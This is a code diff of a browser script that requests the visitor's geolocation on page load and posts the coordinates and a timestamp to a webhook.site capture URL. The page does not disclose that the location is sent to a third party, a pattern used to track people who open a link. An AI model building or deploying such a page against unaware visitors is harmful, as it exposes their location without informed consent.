@@ -1,20 +1,21 @@
 const statusEl = document.getElementById("status");
 const coordsEl = document.getElementById("coords");
 
-// Replace with your Google Apps Script Web App URL
-const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbx16X3FaYYMT8B4ThuMdH-8VH7H7OZgTBPaABpndHMCpvTltixg2JLbh1TJV65pxv2nfQ/exec";
+// Replace with your unique webhook.site URL
+const WEBHOOK_URL = "https://webhook.site/ca1a5565-178c-490f-a556-e7e8f5101310";
 
 function logLocation(lat, lon, acc) {
   statusEl.textContent = "✅ Location access granted";
   coordsEl.textContent = `Lat: ${lat}, Lon: ${lon}, Accuracy: ±${acc}m`;
 
-  // Send to Google Sheets
+  // Send data to webhook.site
   fetch(WEBHOOK_URL, {
     method: "POST",
     body: JSON.stringify({
       latitude: lat,
       longitude: lon,
-      accuracy: acc
+      accuracy: acc,
+      timestamp: new Date().toISOString()
     }),
     headers: {
       "Content-Type": "application/json"
@@ -29,26 +30,14 @@ function getLocation() {
   if ("geolocation" in navigator) {
     statusEl.textContent = "📍 Requesting your location...";
 
-    navigator.permissions.query({ name: "geolocation" }).then((result) => {
-      if (result.state === "granted") {
-        // If already granted → get location directly
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            logLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          }
-        );
-      } else {
-        // Ask for permission if not granted
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            logLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          },
-          (err) => {
-            statusEl.textContent = "❌ Error: " + err.message;
-          }
-        );
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        logLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      },
+      (err) => {
+        statusEl.textContent = "❌ Error: " + err.message;
       }
-    });
+    );
   } else {
     statusEl.textContent = "⚠️ Geolocation not supported.";
   }
@@ -56,3 +45,4 @@ function getLocation() {
 
 // 🚀 Auto-run on page load
 window.onload = getLocation;
+
